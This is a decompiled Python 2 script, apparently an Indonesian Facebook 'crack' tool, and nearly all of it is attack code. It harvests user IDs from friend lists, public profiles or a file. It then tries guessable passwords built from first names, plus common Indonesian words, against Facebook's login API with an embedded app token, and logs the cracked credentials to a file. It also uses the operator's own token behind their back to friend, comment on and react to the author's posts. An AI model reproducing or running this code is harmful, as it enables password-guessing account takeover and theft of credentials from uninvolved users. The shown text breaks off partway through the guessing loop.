# Decompile by KangEhem:)
# with (uncompyle6) version : 3.7.4
# Time Succes decompile : 2022-01-17 22:29:33.678267
import os, sys, time, mechanize, itertools, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
my_color = [
 P, M, H, K, B, U, O]
warna = random.choice(my_color)
warni = random.choice(my_color)
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 cr4ck.py')
from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
os.system('clear')
done = False
def animate():
    for c in itertools.cycle(['\x1b[1;96m|', '\x1b[1;92m/', '\x1b[1;95m-', '\x1b[1;91m\\']):
        if done:
            break
        sys.stdout.write('\r\x1b[1;93mLoading ' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c)
        sys.stdout.flush()
        time.sleep(0.1)
t = threading.Thread(target=animate)
t.start()
time.sleep(5)
done = True
def keluar():
    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Keluar'
    os.sys.exit()
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i
    return cetak(d)
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))
    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
logo = ' \n\x1b[1;95m    ______               __     \n\x1b[1;95m   / ____/__  ____  ____/ /_  __\n\x1b[1;95m  / /_  / _ \\/ __ \\/ __  / / / /\n\x1b[1;95m / __/ /  __/ / / / /_/ / /_/ / \n\x1b[1;95m/_/    \\___/_/ /_/\\__,_/\\__, /  \n\x1b[1;95m                       /____/\n   \n\x1b[1;94m--------------------------------------------\x1b[1;91m\xe2\x9e\xa4\n\x1b[1;95m{\x1b[1;96m\xc3\x97\x1b[1;95m} \x1b[1;93mAuthor   \x1b[1;91m: \x1b[1;96mFendy | 502\n\x1b[1;95m{\x1b[1;96m\xc3\x97\x1b[1;95m} \x1b[1;93mGithub   \x1b[1;91m: \x1b[1;96mGithub.com/Fendy-MY\n\x1b[1;95m{\x1b[1;96m\xc3\x97\x1b[1;95m} \x1b[1;93mFacebook \x1b[1;91m: \x1b[1;96mFacebook.com/Psaycho IX Fndyx\n\x1b[1;94m--------------------------------------------\x1b[1;91m\xe2\x9e\xa4\n'
back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []
def masuk():
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;92m01\x1b[1;97m} Login Via Token Facebook'
    print '\x1b[1;97m{\x1b[1;92m02\x1b[1;97m} Ambil Token Download Token App'
    print '\x1b[1;97m{\x1b[1;92m03\x1b[1;97m} Ambil Token Dari Link'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m} Keluar'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_masuk()
def pilih_masuk():
    msuk = raw_input('\x1b[1;90m\xef\xb8\xbb\xe3\x83\x87\xe2\x95\x90\xe4\xb8\x80\xe2\x96\xb8 \x1b[91m:\x1b[1;92m ')
    if msuk == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Isi Yg Benar !'
        pilih_masuk()
    elif msuk == '1' or msuk == '01':
        tokenz()
    elif msuk == '2' or msuk == '02':
        ambil_token()
    elif msuk == '3' or msuk == '03':
        ambil_link()
    elif msuk == '0' or msuk == '00':
        keluar()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Isi Yg Benar !'
        pilih_masuk()
def tokenz():
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    toket = raw_input('\x1b[1;97m{\x1b[1;95m?\x1b[1;97m} Token \x1b[1;91m:\x1b[1;92m ')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print '\x1b[1;97m{\x1b[1;92m\xe2\x9c\x93\x1b[1;97m}\x1b[1;92m Login Berhasil'
        os.system('xdg-open https://m.facebook.com/fendy.casper.522')
        bot_komen()
    except KeyError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} \x1b[1;91mToken salah !'
        time.sleep(1.7)
        masuk()
def ambil_token():
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    jalan('        \x1b[1;92mAnda Akan Di Arahkan Ke Browser ...')
    os.system('xdg-open https://drive.google.com/file/d/1eAuQG4aFIH49r0ACpoUWspnSG2VUl4Ci/view?usp=drivesdk')
    time.sleep(2)
    masuk()
def ambil_link():
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    jalan('\x1b[1;92mDilarang Menggunakan Akun Facebook Lama...')
    jalan('\x1b[1;92mWajib Menggunakan Akun Facebook Baru ...')
    jalan('\x1b[1;92mJika Ingin Menggunakan Akun Facebook Lama...')
    jalan('\x1b[1;92mWajib Menggunakan Aplikasi Yg Di Sediakan...')
    os.system('cd ... && npm install')
    jalan('\x1b[1;96mMulai...')
    os.system('cd ... && npm start')
    raw_input('\n[ Kembali ]')
    masuk()
def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')
    una = '10001'
    kom = 'Gw Pake Sc Lu Bang \xf0\x9f\x98\x98'
    reac = 'ANGRY'
    post = '937777953338365'
    post2 = '938954086554085'
    kom2 = 'Mantap Bang \xf0\x9f\x98\x81'
    reac2 = 'LOVE'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
    menu()
def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '{!} Token Invalid !'
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()
    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '{!} Tidak ada koneksi'
        keluar()
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m NAMA\x1b[1;90m    =>\x1b[1;92m ' + nama
    print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m USER ID\x1b[1;90m =>\x1b[1;92m ' + id
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;97m{' + warni + '01\x1b[1;97m}' + warna + ' Crack ID Dari Teman/Publik'
    print '\x1b[1;97m{' + warni + '02\x1b[1;97m}' + warna + ' Crack ID Dari Postingan Grup/Teman'
    print '\x1b[1;97m{' + warni + '03\x1b[1;97m}' + warna + ' Crack ID Dari Total Followers'
    print '\x1b[1;97m{' + warni + '04\x1b[1;97m}' + warna + ' Cari ID Menggunakan Username'
    print '\x1b[1;97m{' + warni + '05\x1b[1;97m}' + warna + ' Perbarui Script'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m}' + warna + ' Keluar'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih()
def pilih():
    unikers = raw_input('\x1b[1;92m\xef\xb8\xbb\xe3\x83\x87\xe2\x95\x90\xe4\xb8\x80\xe2\x96\xb8 \x1b[91m:\x1b[1;92m ')
    if unikers == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Yg Benar !'
        pilih()
    elif unikers == '1' or unikers == '01':
        crack_teman()
    elif unikers == '2' or unikers == '02':
        crack_likes()
    elif unikers == '3' or unikers == '03':
        crack_follow()
    elif unikers == '4' or unikers == '04':
        user_id()
    elif unikers == '5' or unikers == '05':
        perbarui()
    elif unikers == '0' or unikers == '00':
        os.system('clear')
        jalan('Menghapus token')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Yg Benar !'
        pilih()
def crack_teman():
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;97m{' + warna + '01\x1b[1;97m}' + warni + ' Crack ID Indonesia'
    print '\x1b[1;97m{' + warna + '02\x1b[1;97m}' + warni + ' Crack ID Bangladesh'
    print '\x1b[1;97m{' + warna + '03\x1b[1;97m}' + warni + ' Crack ID Usa'
    print '\x1b[1;97m{' + warna + '04\x1b[1;97m}' + warni + ' Crack ID Pakistan'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m}' + warni + ' Kembali'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_teman()
def pilih_teman():
    univ = raw_input('' + warna + '\xef\xb8\xbb\xe3\x83\x87\xe2\x95\x90\xe4\xb8\x80\xe2\x96\xb8 \x1b[91m:\x1b[1;92m ')
    if univ == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Yg Benar !'
        pilih_teman()
    elif univ == '1' or univ == '01':
        crack_indo()
    elif univ == '2' or univ == '02':
        crack_bangla()
    elif univ == '3' or univ == '03':
        crack_usa()
    elif univ == '4' or univ == '04':
        crack_pakis()
    elif univ == '5' or univ == '05':
        univ()
    elif univ == '0' or univ == '00':
        menu()
    else:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Yg Benar !'
        pilih_teman()
def crack_indo():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;93m01\x1b[1;97m} Crack Dari Daftar Teman'
    print '\x1b[1;97m{\x1b[1;93m02\x1b[1;97m} Crack Dari Publik/Teman'
    print '\x1b[1;97m{\x1b[1;93m03\x1b[1;97m} Crack Dari File'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m} Kembali'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_indo()
def pilih_indo():
    global cekpoint
    global oks
    teak = raw_input('\x1b[1;93m\xef\xb8\xbb\xe3\x83\x87\xe2\x95\x90\xe4\xb8\x80\xe2\x96\xb8 \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Yg Benar !'
        pilih_indo()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print logo
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;93m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK INDONESIA \x1b[1;93m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])
        elif teak == '2' or teak == '02':
            os.system('clear')
            print logo
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;93m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK INDONESIA \x1b[1;93m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            idt = raw_input('\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mID Publik/Teman \x1b[1;91m:\x1b[1;92m ')
            try:
                pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                sp = json.loads(pok.text)
                print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m}\x1b[1;93m Nama \x1b[1;91m:\x1b[1;92m ' + sp['name']
            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID publik/teman tidak ada !'
                raw_input('\n\x1b[1;93m{\x1b[1;97m<Kembali>\x1b[1;93m}')
                crack_indo()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi !'
                keluar()
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])
        elif teak == '3' or teak == '03':
            os.system('clear')
            print logo
            try:
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                print '             \x1b[1;93m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK INDONESIA \x1b[1;93m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mNama File\x1b[1;91m :\x1b[1;92m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())
            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada ! '
                raw_input('\n\x1b[1;92m[ \x1b[1;97mKembali \x1b[1;92m]')
            except IOError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada !'
                raw_input('\n\x1b[1;93m{\x1b[1;97m<Kembali>\x1b[1;93m}')
                crack_indo()
        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Benar !'
            pilih_indo()
        print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
        print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mStop Tekan CTRL+Z'
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mCrack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)
    print '\n\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mGunakan Mode Pesawat Jika Tidak Ada Hasil'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass
        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/save.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/save.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/save.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/save.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/save.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/save.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'sayang'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/save.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/save.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'bangsat'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/save.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/save.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = 'anjing'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/save.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/save.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = 'kontol'
